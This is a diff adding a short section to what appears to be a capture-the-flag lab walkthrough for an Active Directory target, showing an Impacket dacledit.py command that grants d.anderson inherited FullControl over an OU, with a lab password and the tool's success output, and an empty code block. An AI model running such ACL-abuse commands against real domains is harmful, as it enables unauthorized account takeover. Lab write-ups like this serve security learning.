@@ -336,7 +336,23 @@ This OU contains the `e.rodriguez` user, this means i can apply an inheritance r
 
 # Compromising `e.rodriguez`
 
+```python
+dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb'/'d.anderson':'WAT?watismypass!' -k
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] CCache file is not found. Skipping...
+[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
+/home/kali/.local/bin/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
+  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
+[*] DACL backed up to dacledit-20261004-180336.bak
+[*] DACL modified successfully!
+```
+
+Ill apply the rule to the OU
+
+```python
+
+```
 
 
 
